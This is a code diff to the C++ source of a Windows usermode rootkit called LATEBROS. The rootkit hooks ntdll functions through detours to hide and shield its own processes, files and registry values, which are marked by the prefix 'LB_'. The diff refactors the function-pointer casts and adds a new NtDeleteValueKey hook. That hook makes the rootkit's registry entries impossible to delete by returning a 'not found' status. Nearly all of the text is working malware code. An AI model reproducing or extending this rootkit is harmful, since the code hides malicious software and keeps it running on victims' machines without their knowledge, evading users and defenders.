@@ -3,12 +3,13 @@
 #include <fstream>
 #define ROOTKIT_PREFIX L"LB_"
 
+
+
 /*
  * Function: ntdll!NtOpenProcess
  * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
  *
  */
-typedef NTSTATUS(NTAPI *NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, _CLIENT_ID* ClientId);
 extern "C" char __declspec(dllexport) ntop_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
 {
@@ -18,7 +19,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_
 	detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));
 
 	// CALL
-	reinterpret_cast<NtOpenProcess_t>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);
+	reinterpret_cast<decltype(ntop)*>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
@@ -142,7 +143,7 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 */
 extern "C" char __declspec(dllexport) ntcr_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
-	PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block, 
+	PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block,
 	PLARGE_INTEGER allocation_size, ULONG file_attributes, ULONG share_access, ULONG create_disposition,
 	ULONG create_options, PVOID ea_buffer, ULONG ea_length)
 {
@@ -160,7 +161,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
 	detour::remove_detour(function_pointer, ntcr_og, sizeof(ntcr_og));
 
 	// CALL
-	auto result = NtCreateFile(file_handle, desired_access, object_attributes, io_status_block, allocation_size, file_attributes, share_access, create_disposition,	create_options, ea_buffer, ea_length);
+	auto result = NtCreateFile(file_handle, desired_access, object_attributes, io_status_block, allocation_size, file_attributes, share_access, create_disposition, create_options, ea_buffer, ea_length);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntcr));
@@ -209,7 +210,6 @@ struct FILE_OLE_DIR_INFORMATION {
 	char		pad_0[0x64];		// 0x04 (0x64)
 	wchar_t		file_name[1];		// 0x68
 };
-typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_t)(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan);
 extern "C" char __declspec(dllexport) ntqdf_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan)
 {
@@ -219,7 +219,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 	detour::remove_detour(function_pointer, ntqdf_og, sizeof(ntqdf_og));
 
 	// CALL	
-	auto result = reinterpret_cast<NtQueryDirectoryFile_t>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, length, file_information_class, return_single_entry, file_name, restart_scan);
+	auto result = reinterpret_cast<decltype(ntqdf)*>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, length, file_information_class, return_single_entry, file_name, restart_scan);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntqdf));
@@ -251,3 +251,29 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 	return result;
 }
 
+
+/*
+* Function: ntdll!NtDeleteValueKey
+* Purpose: Protect any LATEBROS registry value from being deleted
+*
+*/
+extern "C" char __declspec(dllexport) ntdvk_og[0xF] = {}; // ORIGINAL BYTES
+extern "C" NTSTATUS __declspec(dllexport) NTAPI ntdvk(HANDLE key_handle, PUNICODE_STRING value_name)
+{
+	std::wstring name(value_name->Buffer, value_name->Length / sizeof(WCHAR));
+	if (name.find(ROOTKIT_PREFIX) != std::wstring::npos) // PROTECTED ENTRY
+		return STATUS_OBJECT_NAME_NOT_FOUND;
+
+	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtDeleteValueKey"));
+
+	// RESTORE
+	detour::remove_detour(function_pointer, ntdvk_og, sizeof(ntdvk_og));
+
+	// CALL	
+	auto result = reinterpret_cast<decltype(ntdvk)*>(function_pointer)(key_handle, value_name);
+
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntdvk));
+
+	return result;
+}
